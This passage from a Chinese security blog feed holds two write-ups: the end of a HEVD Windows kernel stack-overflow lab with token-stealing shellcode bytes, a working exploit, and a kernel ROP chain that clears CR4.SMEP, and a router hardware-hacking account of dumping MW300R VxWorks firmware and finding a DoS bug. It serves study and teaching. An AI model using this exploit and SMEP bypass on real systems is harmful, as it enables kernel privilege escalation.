支持的 ARM。</li></ul></blockquote><p>尝试关闭该保护后执行exp，<strong>但是发现是无法关闭的</strong>，由于内核的整体设计导致该保护在windows8及以上是不能被关闭的，那么就只能想办法绕过了</p><h2 id="a-smep保护机制及手动绕过"><a class="markdownIt-Anchor" href="#a-smep保护机制及手动绕过"></a> A. SMEP保护机制及手动绕过</h2><p>该保护机制强烈依赖于CPU的<code>RC4</code>寄存器，刚好我这里有《英特尔® 64 位和 IA-32 架构开发人员手册合订本》，翻出来看一下</p><p><img src="https://img.joe1sn.top/uploads/big/8dceeeeaf9a0251f0b359cf99c2c1099.png" alt="image-20240118103701065" /></p><blockquote><p>[机翻]从用户模式地址获取指令。<br />访问权限取决于 CR4.SMEP 的值：<br />• 如果CR4.SMEP = 0，访问权限取决于分页模式和IA32_EFER.NXE 的值：<br />— 对于 32 位分页或如果 IA32_EFER.NXE = 0，则可以从任何用户模式获取指令<br />地址。<br />— 对于 IA32_EFER.NXE = 1 的其他分页模式，可以通过每个分页结构条目中 XD 标志为 0 的转换从任何用户模式地址获取指令<br />控制翻译； 指令可能无法从任何用户模式地址获取<br />在任何控制转换的分页结构条目中 XD 标志为 1 的转换。<br />• 如果CR4.SMEP = 1，则不能从任何用户模式地址获取指令。<br />— 仅允许对管理员模式影子堆栈地址进行管理员模式影子堆栈访问<br />（往上看）。</p></blockquote><p>或许我们将<code>CR4.SMEP</code>的值设置为<code>0</code>，访问权限由页中的U/S标志位决定</p><p>CR4寄存器的结构如下（小端序顺序从右向左）：</p><p><img src="https://img.joe1sn.top/uploads/big/f39ac47992f037a218a801528db29eb5.png" alt="image-20240118105721560" /></p><p>不急，继续搜索发现了一份Intel关于SMEP的更详细的描述</p><p>文档：<a href="https://web.archive.org/web/20160803075007/https://www.ncsi.com/nsatc11/presentations/wednesday/emerging_technologies/fischer.pdf">https://web.archive.org/web/20160803075007/https://www.ncsi.com/nsatc11/presentations/wednesday/emerging_technologies/fischer.pdf</a></p><p>尝试使用调试起修改CR4</p><p><img src="https://img.joe1sn.top/uploads/big/ad5cf6efe1bb2811438dd79964396658.png" alt="image-20240118110623235" /></p><p>如果修改第20位为0，rc的值为<code>0x270678</code>，然而还是不行</p><p><img src="https://img.joe1sn.top/uploads/big/358725a8cb68d78d4f738d38b49e1997.png" alt="image-20240118131258807" /></p><h2 id="b-kvas"><a class="markdownIt-Anchor" href="#b-kvas"></a> B. KVAS</h2><p>Windows内核缓解机制使用了Kva Shadow内存，比如MeltDown漏洞就于此有关，首先不会讲细节，<strong>在下一篇文章会讲到</strong>，尝试将其关闭</p><p>再注册表<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management</code></p><p>创建两个DWORD值：<code>FeatureSettingsOverride </code>  <code>FeatureSettingsOverrideMask</code></p><p>设置值为3，然后重启</p><p><img src="https://img.joe1sn.top/uploads/big/cb9c56124685a1418f578b2fefd2f119.png" alt="image-20240118140220468" /></p><p>现在手动设置cr4.SMEP为0</p><p><img src="https://img.joe1sn.top/uploads/big/c5e4751baecdd52edb64fef20d4d2fb2.png" alt="image-20240118141040651" /></p><p>终于运行了</p><p><img src="https://img.joe1sn.top/uploads/big/75325e60ebda69029a1a5f2fcf81358e.png" alt="image-20240118141139354" /></p><p>shellcode的一些偏移有问题</p><p><img src="https://img.joe1sn.top/uploads/big/0bd6d7a7b9886ec9c78440be9a38dff5.png" alt="image-20240118142143111" /></p><p>更换为</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">BYTE cmd[<span class="number">256</span>] = &#123;</span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x80</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x80</span>, <span class="number">0xb8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x89</span>,</span><br><span class="line"><span class="number">0xc1</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x80</span>, <span class="number">0x48</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x50</span>, <span class="number">0xf8</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xc0</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xfa</span>, <span class="number">0x04</span>, <span class="number">0x75</span>, <span class="number">0xf0</span>, <span class="number">0x49</span>, <span class="number">0x8b</span>, <span class="number">0x50</span>,</span><br><span class="line"><span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xe2</span>, <span class="number">0xf8</span>, <span class="number">0x49</span>, <span class="number">0x8b</span>, <span class="number">0x89</span>, <span class="number">0xb8</span>, <span class="number">0x04</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xe1</span>, <span class="number">0x07</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xca</span>, <span class="number">0x49</span>,</span><br><span class="line"><span class="number">0x89</span>, <span class="number">0x91</span>, <span class="number">0xb8</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x04</span>,</span><br><span class="line"><span class="number">0x25</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0x8b</span>, <span class="number">0x88</span>, <span class="number">0xe4</span>, <span class="number">0x01</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0xff</span>, <span class="number">0xc1</span>, <span class="number">0x66</span>, <span class="number">0x89</span>, <span class="number">0x88</span>, <span class="number">0xe4</span>, <span class="number">0x01</span>,</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>,</span><br><span class="line"><span class="number">0x8b</span>, <span class="number">0x8a</span>, <span class="number">0x68</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x4c</span>, <span class="number">0x8b</span>, <span class="number">0x9a</span>, <span class="number">0x78</span>,</span><br><span class="line"><span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0xa2</span>, <span class="number">0x80</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0xaa</span>, <span class="number">0x58</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x0f</span>,</span><br><span class="line"><span class="number">0x01</span>, <span class="number">0xf8</span>, <span class="number">0x48</span>, <span class="number">0x0f</span>, <span class="number">0x07</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>EXP</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">StackOverflow</span><span class="params">(HANDLE hDevice, <span class="type">unsigned</span> <span class="type">int</span> ioctl)</span> </span>&#123;</span><br><span class="line"><span class="type">char</span> stackspace[<span class="number">0x1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">DWORD oldProtect;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Start Exploit\n&quot;</span>);</span><br><span class="line">LPVOID shellcode_addr = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>,</span><br><span class="line"><span class="built_in">sizeof</span>(cmd),</span><br><span class="line">MEM_COMMIT | MEM_RESERVE,</span><br><span class="line">PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="built_in">memcpy</span>(shellcode_addr, cmd, <span class="built_in">sizeof</span>(cmd));</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> size = <span class="number">0x820</span>;</span><br><span class="line"><span class="built_in">RtlFillMemory</span>(stackspace, <span class="number">0x810</span>, <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x818</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)shellcode_addr;</span><br><span class="line"></span><br><span class="line">DWORD info = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;shellcode space %p\n&quot;</span>, shellcode_addr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Spawning a new cmd.exe process\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">DeviceIoControl</span>(hDevice, ioctl,</span><br><span class="line">stackspace, size,</span><br><span class="line"><span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">&amp;info, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;info: %d\n&quot;</span>, info);</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;cmd.exe&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调试中手动CR4.SMEP=0（注意，之前已经关闭了KVA）</p><p><img src="https://img.joe1sn.top/uploads/big/23ad38592a7a932722da80062ab27a04.png" alt="img" /></p><h2 id="c-使用内核rop绕过smep"><a class="markdownIt-Anchor" href="#c-使用内核rop绕过smep"></a> C. 使用内核ROP绕过SMEP</h2><p>首先我们需要一个类似于<code>mov rc4,xxx</code>的rop，让<code>rc4.smep=0</code>，</p><p>参考在Linux下进行ROP的经验， payload大致长这样的</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x818</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)pop_rcx_ret;</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x820</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)<span class="number">0x00000000002506f8</span>;<span class="comment">//set RCX = currentRC4</span></span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x828</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)mov_rc4_rcx_ret;</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x830</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)shellcode_addr;</span><br></pre></td></tr></table></figure><p>多调试或者编程自动寻找就可以找到了，这里暂时参考<a href="https://h0mbre.github.io/HEVD_Stackoverflow_SMEP_Bypass_64bit/#">HEVD Exploits – Windows 10 x64 Stack Overflow SMEP Bypass</a></p><p><img src="https://img.joe1sn.top/uploads/big/8de0787e2e202779fce475c08efcd7d0.png" alt="image-20240118154417340" /></p><p><img src="https://img.joe1sn.top/uploads/big/18ad7dc78e36b58f6d1df6045768734e.png" alt="image-20240118154352984" /></p><p>修改EXP</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> size = <span class="number">0x840</span>;</span><br><span class="line"><span class="built_in">RtlFillMemory</span>(stackspace, <span class="number">0x810</span>, <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x818</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)<span class="number">0xfffff807743f52c0</span>;</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x820</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)<span class="number">0x00000000002506f8</span>;<span class="comment">//set RCX = currentRC4</span></span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x828</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)<span class="number">0xfffff807749a41cf</span>;</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)(stackspace + <span class="number">0x830</span>) = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)shellcode_addr;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Start set ROP\n&quot;</span>);</span><br></pre></td></tr></table></figure><p>没有下断点直接过</p><p><img src="https://img.joe1sn.top/uploads/big/263f646ca04327e676129e83d9178406.png" alt="image-20240118154931459" /></p><p><img src="https://img.joe1sn.top/uploads/big/068bbb9c644915e678b8edb21063071b.png" alt="image-20240118154854993" /></p><h1 id="遗留"><a class="markdownIt-Anchor" href="#遗留"></a> 遗留</h1><p>下一篇</p><ul><li>user编程寻找ROPGadget</li><li>shellcode编写</li><li>Token提权</li><li>KVAS</li></ul><h1 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h1><p><a href="https://www.bilibili.com/video/BV1pD4y1a7hP/">https://www.bilibili.com/video/BV1pD4y1a7hP/</a></p><p><a href="https://www.cnblogs.com/XiuzhuKirakira/p/16995784.html">https://www.cnblogs.com/XiuzhuKirakira/p/16995784.html</a></p><p><a href="https://blog.xpnsec.com/hevd-stack-overflow">https://blog.xpnsec.com/hevd-stack-overflow</a></p><p><a href="https://h0mbre.github.io/HEVD_Stackoverflow_SMEP_Bypass_64bit">https://h0mbre.github.io/HEVD_Stackoverflow_SMEP_Bypass_64bit</a></p><p><a href="https://learn.microsoft.com/zh-cn/windows/security/threat-protection/overview-of-threat-mitigations-in-windows-10">https://learn.microsoft.com/zh-cn/windows/security/threat-protection/overview-of-threat-mitigations-in-windows-10</a></p><p><a href="https://joe1sn.eu.org/2023/02/17/windows_kernel_driver_2/">https://joe1sn.eu.org/2023/02/17/windows_kernel_driver_2/</a></p><p><a href="https://web.archive.org/web/20160803075007/https://www.ncsi.com/nsatc11/presentations/wednesday/emerging_technologies/fischer.pdf">https://web.archive.org/web/20160803075007/https://www.ncsi.com/nsatc11/presentations/wednesday/emerging_technologies/fischer.pdf</a></p><p><a href="https://wumb0.in/windows-10-kvas-and-software-smep.html">https://wumb0.in/windows-10-kvas-and-software-smep.html</a></p><p><a href="https://github.com/xct/windows-kernel-exploits/">https://github.com/xct/windows-kernel-exploits/</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;在&lt;a href=&quot;&quot;&gt;上一篇&lt;/a&gt;中了解了与内核的交互模式，这里就可以开始做HEVD了&lt;/p&gt;
&lt;p&gt;文章已在先知社区投稿：&lt;a href=&quot;https://xz.aliyun.com/t/13364&quot;&gt;https://xz.aliyun.com/t/13364&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="kernel" scheme="https://joe1sn.eu.org/tags/kernel/"/>
    
    <category term="windows" scheme="https://joe1sn.eu.org/tags/windows/"/>
    
    <category term="pwn" scheme="https://joe1sn.eu.org/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>【漏洞挖掘】记一次痛苦的VxWorks路由器漏洞挖掘</title>
    <link href="https://joe1sn.eu.org/2024/01/12/MW300R-vuln/"/>
    <id>https://joe1sn.eu.org/2024/01/12/MW300R-vuln/</id>
    <published>2024-01-12T06:41:03.000Z</published>
    <updated>2024-01-12T07:58:42.061Z</updated>
    
    <content type="html"><![CDATA[<p>问题多又多</p><span id="more"></span><h1 id="记一次痛苦的vxworks路由器漏洞挖掘"><a class="markdownIt-Anchor" href="#记一次痛苦的vxworks路由器漏洞挖掘"></a> 记一次痛苦的VxWorks路由器漏洞挖掘</h1><p>路由器很老了，是Mercury MW300R的某个版本，网上找不到固件，所以最开始想用uart进shell</p><p><img src="https://img.joe1sn.top/uploads/big/71cdd1353aa2a65e2a93bbe74505794c.png" alt="image-20240112140428176" /></p><p>拆开过后可以快速找到UART引脚</p><p><img src="https://img.joe1sn.top/uploads/big/d81c03bcc326000e5b9b614d815ff5c7.png" alt="image-20240112153117629" /></p><h2 id="uart调试"><a class="markdownIt-Anchor" href="#uart调试"></a> UART调试</h2><h3 id="i-打开uart"><a class="markdownIt-Anchor" href="#i-打开uart"></a> I 打开UART</h3><p>路由器断电，然后把万用表调到测接地，黑笔随便找一个电路板上的接口（我用的wifi天线的），红笔测口子，响的那个就是接地</p><p>接着路由器连上电源，万用表调到测电压，黑笔随便找一个电路板上的接口，红笔挨个测试接口</p><ul><li>如果为3.3V左右，那么是电源线（3.3V）</li><li>如果为0V，为接地（GND）</li><li>如果为2.5V左右，为TXD（路由器的Write）</li><li>如果不断跳动，为RXD（路由器的Read）</li></ul><p><strong>然后第一点不寻常的就来了</strong></p><p>我在测试的时候只能通过排除法筛选出了RXD，我的RXD一直为0V</p><p><img src="https://img.joe1sn.top/uploads/big/df439aaa4d8867c9c8b18f22a95516a4.png" alt="image-20240112141505800" /></p><p>这个时候通过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FT232: 3.3V -&gt; 路由器: 3.3v</span><br><span class="line">FT232: GND  -&gt; 路由器: GND</span><br><span class="line">FT232: RXD  -&gt; 路由器: TXD</span><br><span class="line">FT232: TXD  -&gt; 路由器: RXD</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/5ad1558352398a3e6b14c9e3e5c46073.png" alt="image-20240112141907775" /></p><p><strong>插上路由器电源线，但是不插插头</strong>，通过串口就能连上了</p><p><img src="https://img.joe1sn.top/uploads/big/233aa50fe42f5f25c24eac6239ebf2ab.png" alt="image-20240112141950855" /></p><p><img src="https://img.joe1sn.top/uploads/big/82994c0bdd9f2b4aea62b9d6e2c1e53e.png" alt="image-20240112142014239" /></p><p>但是会发现无法输入，导致设备一直重启，在这个地方无法停下autoboot，很显然需要输入来打断</p><p><img src="https://img.joe1sn.top/uploads/big/c1236c0af9b717b34e85926972b4206c.png" alt="image-20240112142420406" /></p><p>但是路由器的RXD一直为0V，说明并没有开启向路由器写入的功能，通过仔细观察电路，发现RXD出口有下面几个接口，不断测试发现RXD可以在下方的焊点使用</p><p><img src="https://img.joe1sn.top/uploads/big/c3d16dc94aba9ff8146c2856f4ca05b6.png" alt="image-20240112143120491" /></p><p><img src="https://img.joe1sn.top/uploads/big/3afacc1f2ea7063dd9974ef16cb89012.png" alt="img" /></p><p>但是我没有架子，而且焊点太小了（本人电烙铁太菜），所以折弯了一根曲别针来传信号</p><p><img src="https://img.joe1sn.top/uploads/big/0e9613116215b8795f1d5ed68339eab5.png" alt="image-20240112143216503" /></p><h3 id="ii-开始调试-a"><a class="markdownIt-Anchor" href="#ii-开始调试-a"></a> II 开始调试 A</h3><p><img src="https://img.joe1sn.top/uploads/big/571f2be4829451e211dcf8573f43f4c4.png" alt="image-20240112143502782" /></p><p>能用的功能特别少，而且tftp功能用不了，不过<code>md</code>可以查看内存</p><p><img src="https://img.joe1sn.top/uploads/big/312c1b8e77e551c29417858947e95854.png" alt="image-20240112143630442" /></p><p>其实这里可以<strong>参考</strong><a href="https://e3pem.github.io/2019/07/03/IoT/%E6%8F%90%E5%8F%96tl-wdr5620%E5%9B%BA%E4%BB%B6/">这篇博客</a>进行dump提取的，但是当时没想到。</p><h3 id="iii-开始调试-b"><a class="markdownIt-Anchor" href="#iii-开始调试-b"></a> III 开始调试 B</h3><p>在进入uboot的时候发现<code>ctrl+C</code>会打断一个TP-Link的shell</p><p><img src="https://img.joe1sn.top/uploads/big/2d96f7d56b8ae8fe623b18558e80d79a.png" alt="img" /></p><p>后续发现插上插头后有概率会停在这里</p><p><img src="https://img.joe1sn.top/uploads/big/7474c84098dc952a5c5eee5346ead3cc.png" alt="image-20240112144335565" /></p><p>使用命令查看内存分配</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flash -layout</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/8577ceadac971f3d42c2aa0655d187ff.png" alt="image-20240112144442000" /></p><p>看到这里我才明白最开始进的是uboot的控制窗口，这里才是真正的Flash存储的启动点</p><p>修改了<a href="https://e3pem.github.io/2019/07/03/IoT/%E6%8F%90%E5%8F%96tl-wdr5620%E5%9B%BA%E4%BB%B6/">这篇博客</a>的脚本按照一样的思路试图提取固件出来，但是binwalk没有任何识别，所以UART走到尽头了</p><h2 id="cha341a法"><a class="markdownIt-Anchor" href="#cha341a法"></a> CHA341A法</h2><p>就是传统的飞线法，路由器上能用芯片夹的就两个芯片，用CHA341编程器读取一下就知道了（记得装驱动）</p><p>关于组装可以看<a href="https://macoshome.com/hackintosh/hcourse/8672.html">这篇</a></p><p><strong>芯片没有识别到，但是重要的是芯片存储的大小</strong>，通过上flash layout可以看到总空间大小是1024KB=1MB，选择大小为1MB的芯片就好了</p><p><img src="https://img.joe1sn.top/uploads/big/3f5f93b6fe9ccdfcfc54dd34435e866e.png" alt="image-20240112145236126" /></p><p>用binwalk看一下，发现是VxWorks的系统，而且根本就没有Unix/Linux的文件系统，而是使用了<code>Wind River </code>文件系统，怪不得所有东西都是一坨，而且知道了程序入口是<code>0x80001000</code></p><p><img src="https://img.joe1sn.top/uploads/big/d9c9135a8be26c1216591ef7d8813e15.png" alt="image-20240112150503842" /></p><p>可以参考<a href="https://e3pem.github.io/2019/07/03/IoT/%E6%8F%90%E5%8F%96tl-wdr5620%E5%9B%BA%E4%BB%B6/">这篇</a>来慢慢提取，不过也可以直接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me MW300R.bin</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/a2348594065a762a3cc1983166df2c7b.png" alt="image-20240112150701769" /></p><p>看上去挺多的，其实根本不慌，随便看一个</p><p><img src="https://img.joe1sn.top/uploads/big/c0af0c85c57c40b65475e67c21787054.png" alt="image-20240112150746160" /></p><p>再看看<code>Wind River</code>那段的数据，按顺序就对对应的不同文件了</p><p><img src="https://img.joe1sn.top/uploads/big/e0cb52fbcca6ca98ff37d6673d177fc3.png" alt="image-20240112150918772" /></p><p>可以按照对应的格式写脚本提取，不过本文的中心并不在这儿。</p><p>在提取的时候发现</p><p><img src="https://img.joe1sn.top/uploads/big/f63e1cf98c122aa8c596bfb7af7ce99c.png" alt="image-20240112151253608" /></p><p>把<code>49200</code>文件特殊看一下</p><p><img src="https://img.joe1sn.top/uploads/big/249494f2709907f5dc0a18650d8fab8a.png" alt="image-20240112151338519" /></p><p>恭喜，找到了主要文件的</p><p>用ida 32位 MIPS大端序打开</p><p><img src="https://img.joe1sn.top/uploads/big/60ee931f155256c22afa57d55644622f.png" alt="image-20240112151500456" /></p><p>根据前文提到的入口地址<code>0x80001000</code>设置入口</p><p><img src="https://img.joe1sn.top/uploads/big/ce3b8f706d348b5b68a467ce65dc9f50.png" alt="image-20240112151550592" /></p><p>在开头按下C就IDA就开始自动分析了</p><p><img src="https://img.joe1sn.top/uploads/big/b5cdbb90e788e174da8417fd777b9807.png" alt="image-20240112151715384" /></p><h2 id="漏洞挖掘"><a class="markdownIt-Anchor" href="#漏洞挖掘"></a> 漏洞挖掘</h2><p>上面的二进制分析起来还是有难度的，不过用常规思路（包括web）即可</p><p>比如一个很明显的DOS洞，很明显只做了前端校验</p><p><img src="https://img.joe1sn.top/uploads/big/1d769daf0f6578f0f773a90d36c2d831.png" alt="image-20240112151913239" /></p><p>直接把路由器打崩，得重启才能恢复正常工作</p><h1 id="引用"><a class="markdownIt-Anchor" href="#引用"></a> 引用</h1><p><a href="https://paper.seebug.org/2024">https://paper.seebug.org/2024</a></p><p><a 